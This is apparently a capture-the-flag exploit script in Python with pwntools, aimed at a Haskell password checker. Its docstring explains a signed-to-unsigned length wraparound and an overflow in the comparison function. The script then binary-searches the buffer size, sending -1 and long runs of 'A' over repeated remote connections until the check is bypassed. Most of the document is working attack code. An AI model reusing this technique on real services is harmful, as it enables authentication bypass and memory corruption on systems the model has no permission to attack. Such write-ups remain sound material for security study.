from pwn import *
#context.log_level='debug'

'''
It should be noted there are 2 vulnerabilities in the program.
1) Converting Signed Integers to Unsigned Integers 
2) vulnerable comparison function

Notice in function b, 
b :: Integer -> Word
b a | (a >= 100) = fromInteger(100) :: Word
    | (a >= 0 && a <= 2) = fromInteger(2) :: Word
    | (a < 100) = fromInteger(a) :: Word

This is insecure as sending -1 will give us an insanely large value.
Note, haskell will wrap around when converting negative numbers to unsigned integers.

As such, by sending -1, we can get unlimited input since function c essentially restricts our input to the size we give. 

the comparison function d can be cleaned up as such:

strcmp :: Int -> ByteString -> ByteString -> IO Bool
strcmp len s1 s2 =
    allocaArray len $ \b1 -> do
        let l = len `div` 2
            l1 = BS.length s1
            l2 = BS.length s2
            b2 = plusPtr b1 16
        when (l1 > len || l2 > len) $ exitFailure
        pokeArray b2 (BS.unpack s2)
        when (l2 < l) $ pokeArray (plusPtr b2 l2) (replicate (l - l2) (0 :: Word8))
        pokeArray b1 (BS.unpack s1)
        when (l1 < l) $ pokeArray (plusPtr b1 l1) (replicate (l - l1) (0 :: Word8))
        and <$> forM [0..(l-1)] (\i -> do
            c1 <- peekByteOff b1 i :: IO Word8
            c2 <- peekByteOff b2 i
            return $ c1 == c2)
Notice, there is no length check performed on both strings, apart from making sure they do not exceed someNum. 
HOWEVER, notice that this comparison is insecure. 

Function d performs the following:
1) allocate an array of size someNum
2) copy over our acutal password (s2) into (someNum/2 -1) index to the end of the array
3) copy over our guess (s1) into the start of the array onwards. 
4) Loop through the array ensuring that 
       Index 0 equals Index (someNum/2 -1) 
       Index 1 equals Index (someNum/2 -1) + 1 
       Index 2 equals Index (someNum/2 -1) + 2
       ... 
       Index (someNum/2) equals Index (someNum-1) 

Notice since we never check that s1 or s2 is more than half the size of the array, we can overflow the allocated array. 
By sending someNum * "A", we can overflow and overwrite the contents of s2 in the array. 
During step 4, the function will return TRUE since all the chars in the array of someNum are the same ("A" in this case)

However, we still have not figured out what is the value of someNum.
It would be unwise to iterate from 1 to 800000 to find someNum. However, we can binary search!
Notice that when our guess is less than someNum, the program tells us our guess is wrong. 
When our guess is more than someNum, the program exits. 

Combining all this together, we obtain the following script!
'''

def send(p,num):
    p.recvuntil("Input the length of password to randomly generate:")
    p.sendline("-1")
    p.recvuntil("Enter your guess:")
    p.sendline(b"A"*num)
    p.recvline()
    return p.recvline()

r = 800000
l = 0

while (l < r):
    mid = (l + r) // 2
    p = remote("0.0.0.0",1337)
    try: 
        response = send(p,mid)
        if response == b"Sorry, your guess is wrong. Try again next time!\n":
            l = mid + 1
            p.close()
        elif response == b'Congrats! You guessed the password!\n':
            print(p.recvline())
            p.close()
            exit()
    except:
        #assume something went wrong
        r = mid -1
        p.close()